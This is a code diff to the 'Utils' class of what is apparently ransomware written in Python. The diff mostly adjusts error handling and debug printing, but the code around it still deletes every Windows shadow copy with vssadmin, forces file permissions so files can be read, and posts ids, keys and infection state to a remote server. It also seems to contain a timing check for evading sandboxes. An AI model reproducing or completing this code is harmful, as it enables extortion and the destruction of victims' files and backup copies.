@@ -93,15 +93,19 @@ class Utils:
         else:
             raise ValueError('Invalid argument at the time of saving data')
 
-
+    # Dunno whats wrong with this
     def load_data(self, full_path):
+        """
         if not os.access(full_path, os.R_OK):
             oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
             if not os.access(full_path, os.R_OK):
                 raise PermissionError("Read permisions can't be modified")
-
-        with open(full_path, 'rb') as file:
-            return file.read()
+        """ 
+        try:
+            with open(full_path, 'rb') as file:
+                return file.read()
+        except:
+            pass
 
     
     def search_and_split(self, local_drives):
@@ -194,7 +198,7 @@ class Utils:
         try:
             os.system("cmd /c vssadmin delete shadows /all /quiet")
         except:
-            pass
+            traceback.print_exc()
 
 
     def enable_task_manager(self):
@@ -264,6 +268,7 @@ class Utils:
                 data = {'operation':mode, 'id': id, 'key': str(key), 'date':date, 'state': state}
             elif mode=='update':
                 data = {'operation':mode, 'id': id, 'state': state}
+            print(data)
             requests.post(url, json=data)
         except:
             traceback.print_exc()
@@ -288,6 +293,7 @@ class Utils:
             if (((t3-t2)/(t2-t1)) >= 10):
                 return True
         return False
+    
 
 # LINKS HERE
 # https://www.youtube.com/watch?v=UoMzCyB2IvE
